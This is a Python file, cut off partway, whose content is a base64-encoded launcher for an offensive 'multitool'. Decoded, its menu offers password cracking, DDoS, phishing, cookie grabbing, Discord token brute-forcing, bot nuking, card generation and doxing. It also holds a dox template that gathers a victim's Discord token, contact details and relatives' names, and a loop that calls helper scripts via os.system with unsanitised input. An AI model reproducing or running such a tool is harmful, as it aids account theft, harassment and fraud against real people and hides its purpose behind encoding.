import base64
code_base64 = """IyBDb3B5cmlnaHQgKGMpIHRvb2wgSUtPL1N3bmF4CiMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLXwKIyAgICAgLSBEbyBub3QgdG91Y2ggb3IgbW9kaWZ5IHRoZSBjb2RlIGJlbG93LiBJZiB0aGVyZSBpcyBhbiBlcnJvciwgcGxlYXNlIGNvbnRhY3QgdGhlIG93bmVyLCBidXQgdW5kZXIgbm8gY2lyY3Vtc3RhbmNlcyBzaG91bGQgeW91IHRvdWNoIHRoZSBjb2RlLgojICAgICAtIERvIG5vdCByZXNlbGwgdGhpcyB0b29sLCBkbyBub3QgY3JlZGl0IGl0IHRvIHlvdXJzLgojICAgICAtIE5lIHBhcyB0b3VjaGVyIG5pIG1vZGlmaWVyIGxlIGNvZGUgY2ktZGVzc291cy4gRW4gY2FzIGQnZXJyZXVyLCB2ZXVpbGxleiBjb250YWN0ZXIgbGUgcHJvcHJpw6l0YWlyZSwgbWFpcyBlbiBhdWN1biBjYXMgdm91cyBuZSBkZXZleiB0b3VjaGVyIGF1IGNvZGUuCiMgICAgIC0gTmUgcmV2ZW5kZXogcGFzIGNlIHRvb2wsIG5lIGxlIGNyw6lkaXRleiBwYXMgYXUgdsO0dHJlLgoKaW1wb3J0IG9zCmltcG9ydCBmYWRlCmZyb20gZmFkZSBpbXBvcnQgZmlyZQpmcm9tIGNvbG9yYW1hIGltcG9ydCBGb3JlLCBTdHlsZSwgaW5pdAojIENvcHlyaWdodCAoYykgdG9vbCBJS08vU3duYXgKIyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tfAojICAgICAtIERvIG5vdCB0b3VjaCBvciBtb2RpZnkgdGhlIGNvZGUgYmVsb3cuIElmIHRoZXJlIGlzIGFuIGVycm9yLCBwbGVhc2UgY29udGFjdCB0aGUgb3duZXIsIGJ1dCB1bmRlciBubyBjaXJjdW1zdGFuY2VzIHNob3VsZCB5b3UgdG91Y2ggdGhlIGNvZGUuCiMgICAgIC0gRG8gbm90IHJlc2VsbCB0aGlzIHRvb2wsIGRvIG5vdCBjcmVkaXQgaXQgdG8geW91cnMuCiMgICAgIC0gTmUgcGFzIHRvdWNoZXIgbmkgbW9kaWZpZXIgbGUgY29kZSBjaS1kZXNzb3VzLiBFbiBjYXMgZCdlcnJldXIsIHZldWlsbGV6IGNvbnRhY3RlciBsZSBwcm9wcmnDqXRhaXJlLCBtYWlzIGVuIGF1Y3VuIGNhcyB2b3VzIG5lIGRldmV6IHRvdWNoZXIgYXUgY29kZS4KIyAgICAgLSBOZSByZXZlbmRleiBwYXMgY2UgdG9vbCwgbmUgbGUgY3LDqWRpdGV6IHBhcyBhdSB2w7R0cmUuCmltcG9ydCB3ZWJicm93c2VyCmltcG9ydCBoYXNobGliCmltcG9ydCByZXF1ZXN0cwppbml0KCkKCmJhbm5lciA9ICIiIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQ29weXJpZ2h0IMKpCiAg4paI4paI4paI4paI4paI4paI4paI4pWX4paI4paI4pWXICAgIOKWiOKWiOKVl+KWiOKWiOKWiOKVlyAgIOKWiOKWiOKVlyDilojilojilojilojilojilZcg4paI4paI4pWXICDilojilojilZcgICAg4paI4paI4paI4paI4paI4paI4paI4paI4pWXIOKWiOKWiOKWiOKWiOKWiOKWiOKVlyAg4paI4paI4paI4paI4paI4paI4pWXIOKWiOKWiOKVlyAgICAg4paI4paI4paI4paI4paI4paI4paI4pWXCiAg4paI4paI4pWU4pWQ4pWQ4pWQ4pWQ4pWd4paI4paI4pWRICAgIOKWiOKWiOKVkeKWiOKWiOKWiOKWiOKVlyAg4paI4paI4pWR4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4pWa4paI4paI4pWX4paI4paI4pWU4pWdICAgIOKVmuKVkOKVkOKWiOKWiOKVlOKVkOKVkOKVneKWiOKWiOKVlOKVkOKVkOKVkOKWiOKWiOKVl+KWiOKWiOKVlOKVkOKVkOKVkOKWiOKWiOKVl+KWiOKWiOKVkSAgICAg4pWa4pWQ4pWQ4paI4paI4paI4pWU4pWdCiAg4paI4paI4paI4paI4paI4paI4paI4pWX4paI4paI4pWRIOKWiOKVlyDilojilojilZHilojilojilZTilojilojilZcg4paI4paI4pWR4paI4paI4paI4paI4paI4paI4paI4pWRIOKVmuKWiOKWiOKWiOKVlOKVnSAgICAgICAg4paI4paI4pWRICAg4paI4paI4pWRICAg4paI4paI4pWR4paI4paI4pWRICAg4paI4paI4pWR4paI4paI4pWRICAgICAgIOKWiOKWiOKWiOKVlOKVnSAKICDilZrilZDilZDilZDilZDilojilojilZHilojilojilZHilojilojilojilZfilojilojilZHilojilojilZHilZrilojilojilZfilojilojilZHilojilojilZTilZDilZDilojilojilZEg4paI4paI4pWU4paI4paI4pWXICAgICAgICDilojilojilZEgICDilojilojilZEgICDilojilojilZHilojilojilZEgICDilojilojilZHilojilojilZEgICAgICDilojilojilojilZTilZ0KICDilojilojilojilojilojilojilojilZHilZrilojilojilojilZTilojilojilojilZTilZ3ilojilojilZEg4pWa4paI4paI4paI4paI4pWR4paI4paI4pWRICDilojilojilZHilojilojilZTilZ0g4paI4paI4pWXICAgICAgIOKWiOKWiOKVkSAgIOKVmuKWiOKWiOKWiOKWiOKWiOKWiOKVlOKVneKVmuKWiOKWiOKWiOKWiOKWiOKWiOKVlOKVneKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKWiOKWiOKWiOKWiOKWiOKVlwogIOKVmuKVkOKVkOKVkOKVkOKVkOKVkOKVnSDilZrilZDilZDilZ3ilZrilZDilZDilZ0g4pWa4pWQ4pWdICDilZrilZDilZDilZDilZ3ilZrilZDilZ0gIOKVmuKVkOKVneKVmuKVkOKVnSAg4pWa4pWQ4pWdICAgICAgIOKVmuKVkOKVnSAgICDilZrilZDilZDilZDilZDilZDilZ0gIOKVmuKVkOKVkOKVkOKVkOKVkOKVnSDilZrilZDilZDilZDilZDilZDilZDilZ3ilZrilZDilZDilZDilZDilZDilZDilZ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAg4pWU4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWXCiAgICAgICAgICAgICAgICAgIOKVkSBDb25maWcgYnkgSUtPICAgICAgfCAgICAgIENMSSBieSBTd25heCAg4pWRICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgIOKVmuKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVnSAgICAgICAgICAgCiAgICAgICAgICAiIiIKCmJhbm5lciA9IGZpcmUgKCBiYW5uZXIgKQoKIyBNZW51Cm1lbnUgPSAiIiIgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAg4pWU4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWXICAKICAgICAgICAgICAgICAg4pWRIFswXSBQQVNTV09SRCBDUkFDS0VSIFsxMV0gV0VCSE9PSyBTRU5EICAgICAgICDilZEKICAgICAgICAgICAgICAg4pWRIFsxXSBJUCBJTkZPICAgICAgICAgIFsxMl0gQk9UIE5VS0VSICAgICAgICAgICDilZEKICAgICAgICAgICAgICAg4pWRIFsyXSBJUCBQT1JUIFNDQU4gICAgIFsxM10gRU1BSUwgTE9PS1VQICAgICAgICDilZEKICAgICAgICAgICAgICAg4pWRIFszXSBET1ggQ1JFQVRFICAgICAgIFsxNF0gUEFTU1dPUkQgTE9PS1VQICAgICDilZEKICAgICAgICAgICAgICAg4pWRIFs0XSBNWSBJUCAgICAgICAgICAgIFsxNV0gR1JBQiBDT09LSUVTICAgICAgICDilZEKICAgICAgICAgICAgICAg4pWRIFs1XSBUT0tFTiBDSEVDS0VSICAgIFsxNl0gV0VCU0lURSBJTkZPICAgICAgICDilZEKICAgICAgICAgICAgICAg4pWRIFs2XSBERE9TICAgICAgICAgICAgIFsxN10gUEhJU0hJTkcgQVRUQUNLICAgICDilZEKICAgICAgICAgICAgICAg4pWRIFs3XSBDQVJEIEdFTiAgICAgICAgIFsxOF0gUEFTU1dPUkQgRU5DUllQVCAgICDilZEKICAgICAgICAgICAgICAg4pWRIFs4XSBUT0tFTiBCUlVURk9SQ0UgIFsxOV0gRE9YIFRSQUNLRVIgICAgICAgICDilZEKICAgICAgICAgICAgICAg4pWRIFs5XSBOVU1CRVIgTE9PS1VQICAgIFsyMF0gVVNFUk5BTUUgVFJBQ0tFUiAgICDilZEKICAgICAgICAgICAgICAg4pWRIFsxMF1JUCBQSU5HRVIgICAgICAgIFsjXSAgTUFERSBCWSB1dGlseXR1LElLTyDilZEKICAgICAgICAgICAgICAg4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWdIAoiIiIKCm1lbnUgPSBmaXJlICggbWVudSApCgoKZG94X3RlbXBsYXRlID0gIiIiCuKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhAoKICAgICAgICAgICAgICAgICAgICAgIOKWiOKWiOKWiOKWiOKWiOKWiOKVlyAgIOKWiOKWiOKWiOKWiOKWiOKWiOKVlyAg4paI4paI4pWXICDilojilojilZcKICAgICAgICAgICAgICAgICAgICAgIOKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVlyDilojilojilZTilZDilZDilZDilojilojilZcg4pWa4paI4paI4pWX4paI4paI4pWU4pWdCiAgICAgICAgICAgICAgICAgICAgICDilojilojilZEgIOKWiOKWiOKVkSDilojilojilZEgICDilojilojilZEgIOKVmuKWiOKWiOKWiOKVlOKVnSAKICAgICAgICAgICAgICAgICAgICAgIOKWiOKWiOKVkSAg4paI4paI4pWRIOKWiOKWiOKVkSAgIOKWiOKWiOKVkSAg4paI4paI4pWU4paI4paI4pWXIAogICAgICAgICAgICAgICAgICAgICAg4paI4paI4paI4paI4paI4paI4pWU4pWdIOKVmuKWiOKWiOKWiOKWiOKWiOKWiOKVlOKVnSDilojilojilZTilZ0g4paI4paI4pWXIAogICAgICAgICAgICAgICAgICAgICAg4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWdICAg4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWdICDilZrilZDilZ0gIOKVmuKVkOKVnSAgIAoKICAgICAgICAgICAgICAgICAgICAgICAgICAgRG94ZWQgQnkgOiB7Ynl9CiAgICAgICAgICAgICAgICAgICAgICAgICAgIFJlYXNvbiAgIDoge3JlYXNvbn0KICAgICAgICAgICAgICAgICAgICAgICAgICAgUHNldWRvICAgOiAie3BzZXVkbzF9IiwgIntwc2V1ZG8yfSIKCuKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhAoK4pWU4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWXCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRElTQ09SRDoKICAgID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0KICAgICAgICAgICAgICAgICAgICBbK10gVXNlcm5hbWUgICAgIDoge3VzZXJuYW1lX2Rpc2NvcmR9CiAgICAgICAgICAgICAgICAgICAgWytdIERpc3BsYXkgTmFtZSA6IHtkaXNwbGF5X25hbWVfZGlzY29yZH0KICAgICAgICAgICAgICAgICAgICBbK10gSUQgICAgICAgICAgIDoge3VzZXJfaWRfZGlzY29yZH0KICAgICAgICAgICAgICAgICAgICBbK10gQXZhdGFyICAgICAgIDoge2F2YXRhcl91cmxfZGlzY29yZH0KICAgICAgICAgICAgICAgICAgICBbK10gQ3JlYXRlZCBBdCAgIDoge2NyZWF0ZWRfYXRfZGlzY29yZH0KICAgICAgICAgICAgICAgICAgICBbK10gVG9rZW4gICAgICAgIDoge3Rva2VufQogICAgICAgICAgICAgICAgICAgIFsrXSBFLU1haWwgICAgICAgOiB7ZW1haWxfZGlzY29yZH0KICAgICAgICAgICAgICAgICAgICBbK10gUGhvbmUgICAgICAgIDoge3Bob25lX2Rpc2NvcmR9CiAgICAgICAgICAgICAgICAgICAgWytdIE5pdHJvICAgICAgICA6IHtuaXRyb19kaXNjb3JkfQogICAgICAgICAgICAgICAgICAgIFsrXSBGcmllbmRzICAgICAgOiB7ZnJpZW5kc19kaXNjb3JkfQogICAgICAgICAgICAgICAgICAgIFsrXSBHaWZ0IENvZGUgICAgOiB7Z2lmdF9jb2Rlc19kaXNjb3JkfQogICAgICAgICAgICAgICAgICAgIFsrXSBNdWx0aS1GYWN0b3IgQXV0aGVudGljYXRpb24gOiB7bWZhX2Rpc2NvcmR9CiAgICAgICAgICAgICAgICAgICAgICAr4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAUGhvbmXilIDilIDilIDilIDilIDilIDilIDilIDilIDilIArCiAgICAgICAgICAgICAgICAgICAgICAgWytdIFBob25lIE51bWJlciA6IHtwaG9uZV9udW1iZXJ9CiAgICAgICAgICAgICAgICAgICAgICAgWytdIEJyYW5kICAgICAgICA6IHticmFuZF9waG9uZX0KICAgICAgICAgICAgICAgICAgICAgICBbK10gT3BlcmF0b3IgICAgIDoge29wZXJhdG9yX3Bob25lfQogICAgICAgICAgICAgICAgICAgICAgIFsrXSBUeXBlIE51bWJlciAgOiB7dHlwZV9udW1iZXJfcGhvbmV9CiAgICAgICAgICAgICAgICAgICAgICAgWytdIENvdW50cnkgICAgICA6IHtjb3VudHJ5X3Bob25lfQogICAgICAgICAgICAgICAgICAgICAgIFsrXSBSZWdpb24gICAgICAgOiB7cmVnaW9uX3Bob25lfQogICAgICAgICAgICAgICAgICAgICAgIFsrXSBUaW1lem9uZSAgICAgOiB7dGltZXpvbmVfcGhvbmV9CgogICAgICAgICAgICAgICAgICAgICAgICvilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBQZXJzb25hbOKUgOKUgOKUgOKUgOKUgOKUgOKUgCsKICAgICAgICAgICAgICAgICAgICAgICAgWytdIEdlbmRlciAgICAgIDoge2dlbmRlcn0KICAgICAgICAgICAgICAgICAgICAgICAgWytdIExhc3QgTmFtZSAgIDoge2xhc3RfbmFtZX0KICAgICAgICAgICAgICAgICAgICAgICAgWytdIEZpcnN0IE5hbWUgIDoge2ZpcnN0X25hbWV9CiAgICAgICAgICAgICAgICAgICAgICAgIFsrXSBBZ2UgICAgICAgICA6ICB7YWdlfSIKICAgICAgICAgICAgICAgICAgICAgICAgWytdIE1vdGhlciAgICAgIDoge21vdGhlcn0KICAgICAgICAgICAgICAgICAgICAgICAgWytdIEZhdGhlciAgICAgIDoge2ZhdGhlcn0KICAgICAgICAgICAgICAgICAgICAgICAgWytdIEJyb3RoZXIgICAgIDoge2Jyb3RoZXJ9CiAgICAgICAgICAgICAgICAgICAgICAgIFsrXSBTaXN0ZXIgICAgICA6IHtzaXN0ZXJ9CuKVmuKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVnQoKICAgICAgICAg4paI4paI4paTICAgIOKWiOKWiCDiloTilojiloAgICAg4paS4paI4paI4paI4paI4paIICAgICDiloTiloTiloTilojilojilojilojilojilpMg4paS4paI4paI4paI4paI4paIICAg4paS4paI4paI4paI4paI4paIICAg4paI4paI4paTICAgIAogICAgICAgIOKWk+KWiOKWiOKWkiAgICDilojilojiloTilojilpIgICAg4paS4paI4paI4paSICDilojilojilpIgICDilpMgIOKWiOKWiOKWkiDilpPilpLilpLilojilojilpIgIOKWiOKWiOKWkuKWkuKWiOKWiOKWkiAg4paI4paI4paS4paT4paI4paI4paSICAgIAogICAgICAgIOKWkuKWiOKWiOKWkiAgIOKWk+KWiOKWiOKWiOKWhOKWkSAgICDilpLilojilojilpEgIOKWiOKWiOKWkiAgIOKWkiDilpPilojilojilpEg4paS4paR4paS4paI4paI4paRICDilojilojilpLilpLilojilojilpEgIOKWiOKWiOKWkuKWkuKWiOKWiOKWkSAgICAKICAgICAgICDilpHilojilojilpEgICDilpPilojilogg4paI4paEICAgIOKWkuKWiOKWiCAgIOKWiOKWiOKWkSAgIOKWkSDilpPilojilojilpMg4paRIOKWkuKWiOKWiCAgIOKWiOKWiOKWkeKWkuKWiOKWiCAgIOKWiOKWiOKWkeKWkuKWiOKWiOKWkSAgICAKICAgICAgICDilpHilojilojilpEgICDilpLilojilojilpIg4paI4paEICAg4paRIOKWiOKWiOKWiOKWiOKWk+KWkuKWkSAgICAg4paS4paI4paI4paSIOKWkSDilpEg4paI4paI4paI4paI4paT4paS4paR4paRIOKWiOKWiOKWiOKWiOKWk+KWkuKWkeKWkeKWiOKWiOKWiOKWiOKWiOKWiOKWkgogICAgICAgIOKWkeKWkyAgICAg4paSIOKWkuKWkiDilpPilpIgICDilpEg4paS4paR4paS4paR4paS4paRICAgICAg4paSIOKWkeKWkSAgIOKWkSDilpLilpHilpLilpHilpLilpEg4paRIOKWkuKWkeKWkuKWkeKWkuKWkSDilpEg4paS4paR4paTICDilpEKICAgICAgICAg4paSIOKWkSAgIOKWkSDilpHilpIg4paS4paRICAgICDilpEg4paSIOKWkuKWkSAgICAgICAg4paRICAgICAg4paRIOKWkiDilpLilpEgICDilpEg4paSIOKWkuKWkSDilpEg4paRIOKWkiAg4paRCiAgICAgICAgIOKWkiDilpEgICDilpEg4paR4paRIOKWkSAgICDilpEg4paRIOKWkSDilpIgICAgICAg4paRICAgICAg4paRIOKWkSDilpEg4paSICDilpEg4paRIOKWkSDilpIgICAg4paRIOKWkSAgIAogICAgICAgICDilpEgICAgIOKWkSAg4paRICAgICAgICAgIOKWkSDilpEgICAgICAgICAgICAgICAgICDilpEg4paRICAgICAg4paRIOKWkSAgICAgIOKWkSAg4paRCgoiIiIKZG94X3RlbXBsYXRlID0gZmlyZSAoIGRveF90ZW1wbGF0ZSApCgojIENvcHlyaWdodCAoYykgdG9vbCBJS08vU3duYXgKIyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tfAojICAgICAtIERvIG5vdCB0b3VjaCBvciBtb2RpZnkgdGhlIGNvZGUgYmVsb3cuIElmIHRoZXJlIGlzIGFuIGVycm9yLCBwbGVhc2UgY29udGFjdCB0aGUgb3duZXIsIGJ1dCB1bmRlciBubyBjaXJjdW1zdGFuY2VzIHNob3VsZCB5b3UgdG91Y2ggdGhlIGNvZGUuCiMgICAgIC0gRG8gbm90IHJlc2VsbCB0aGlzIHRvb2wsIGRvIG5vdCBjcmVkaXQgaXQgdG8geW91cnMuCiMgICAgIC0gTmUgcGFzIHRvdWNoZXIgbmkgbW9kaWZpZXIgbGUgY29kZSBjaS1kZXNzb3VzLiBFbiBjYXMgZCdlcnJldXIsIHZldWlsbGV6IGNvbnRhY3RlciBsZSBwcm9wcmnDqXRhaXJlLCBtYWlzIGVuIGF1Y3VuIGNhcyB2b3VzIG5lIGRldmV6IHRvdWNoZXIgYXUgY29kZS4KIyAgICAgLSBOZSByZXZlbmRleiBwYXMgY2UgdG9vbCwgbmUgbGUgY3LDqWRpdGV6IHBhcyBhdSB2w7R0cmUuCmRlZiBzaG93X21lbnUoKSA6CiAgICBvcy5zeXN0ZW0gKCAiY2xzIiApCiAgICBwcmludCAoIGJhbm5lciApCiAgICBwcmludCAoKQogICAgcHJpbnQgKCBtZW51ICkKCgoKZGVmIG1haW4oKToKICAgIHdoaWxlIFRydWU6CiAgICAgICAgc2hvd19tZW51KCkKICAgICAgICBjaG9pY2UgPSBpbnB1dChGb3JlLkxJR0hUWUVMTE9XX0VYICsgU3R5bGUuQlJJR0hUICsgIkNob29zZSBhbiBvcHRpb24gOiAiICsgU3R5bGUuUkVTRVRfQUxMKQoKICAgICAgICBpZiBjaG9pY2UgPT0gIjEiIDoKICAgICAgICAgICAgaXBfYWRkcmVzcyA9IGlucHV0ICggRm9yZS5MSUdIVFJFRF9FWCArIFN0eWxlLkJSSUdIVCArICJFbnRyZXogbCdhZHJlc3NlIElQIMOgIHJlY2hlcmNoZXIgOiAiICsgU3R5bGUuUkVTRVRfQUxMICkKICAgICAgICAgICAgIyBDb3B5cmlnaHQgKGMpIHRvb2wgSUtPL1N3bmF4CiAgICAgICAgICAgICMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLXwKICAgICAgICAgICAgIyAgICAgLSBEbyBub3QgdG91Y2ggb3IgbW9kaWZ5IHRoZSBjb2RlIGJlbG93LiBJZiB0aGVyZSBpcyBhbiBlcnJvciwgcGxlYXNlIGNvbnRhY3QgdGhlIG93bmVyLCBidXQgdW5kZXIgbm8gY2lyY3Vtc3RhbmNlcyBzaG91bGQgeW91IHRvdWNoIHRoZSBjb2RlLgogICAgICAgICAgICAjICAgICAtIERvIG5vdCByZXNlbGwgdGhpcyB0b29sLCBkbyBub3QgY3JlZGl0IGl0IHRvIHlvdXJzLgogICAgICAgICAgICAjICAgICAtIE5lIHBhcyB0b3VjaGVyIG5pIG1vZGlmaWVyIGxlIGNvZGUgY2ktZGVzc291cy4gRW4gY2FzIGQnZXJyZXVyLCB2ZXVpbGxleiBjb250YWN0ZXIgbGUgcHJvcHJpw6l0YWlyZSwgbWFpcyBlbiBhdWN1biBjYXMgdm91cyBuZSBkZXZleiB0b3VjaGVyIGF1IGNvZGUuCiAgICAgICAgICAgICMgICAgIC0gTmUgcmV2ZW5kZXogcGFzIGNlIHRvb2wsIG5lIGxlIGNyw6lkaXRleiBwYXMgYXUgdsO0dHJlLgogICAgICAgICAgICBvcy5zeXN0ZW0gKCBmInB5dGhvbiBpcF9pbmZvLnB5IHtpcF9hZGRyZXNzfSIgKQogICAgICAgICAgICBpbnB1dCAoICJBcHB1eWV6IHN1ciBFbnRyw6llIHBvdXIgcmV2ZW5pciBhdSBtZW51Li4uIiApCgogICAgICAgIGVsaWYgY2hvaWNlID09ICIyIiA6CiAgICAgICAgICAgIGlwX2FkZHJlc3MgPSBpbnB1dCAoIEZvcmUuTElHSFRSRURfRVggKyBTdHlsZS5CUklHSFQgKyAiRW50cmV6IGwnYWRyZXNzZSBJUCDDoCBzY2FubmVyIDogIiArIFN0eWxlLlJFU0VUX0FMTCApCiAgICAgICAgICAgIHBvcnRzID0gaW5wdXQgKCBGb3JlLkxJR0hUWUVMTE9XX0VYICsgU3R5bGUuQlJJR0hUICsgIkVudHJleiBsZXMgcG9ydHMgw6Agc2Nhbm5lciAoc8OpcGFyw6lzIHBhciBkZXMgdmlyZ3VsZXMpIDogOiAiICsgU3R5bGUuUkVTRVRfQUxMICkuc3BsaXQgKCAnLCcgKQogICAgICAgICAgICBwb3J0cyA9IFtpbnQgKCBwb3J0LnN0cmlwICgpICkgZm9yIHBvcnQgaW4gcG9ydHNdCiAgICAgICAgICAgIG9zLnN5c3RlbSAoIGYicHl0aG9uIGlwX3BvcnRfc2Nhbi5weSB7aXBfYWRkcmVzc30geycgJy5qb2luICggbWFwICggc3RyLCBwb3J0cyApICl9IiApCiAgICAgICAgICAgIGlucHV0ICggIkFwcHV5ZXogc3VyIEVudHLDqWUgcG91ciByZXZlbmlyIGF1IG1lbnUuLi4iICkKCgogICAgICAgIGVsaWYgY2hvaWNlID09ICIwIiA6CgogICAgICAgICAgICBvcy5zeXN0ZW0gKCAicHl0aG9uIHBhc3N3b3JkX2NyYWNrZXIucHkiICkKCiAgICAgICAgICAgIGlucHV0ICggIkFwcHV5ZXogc3VyIEVudHLDqWUgcG91ciByZXZlbmlyIGF1IG1lbnUuLi4iICkKCiAgICAgICAg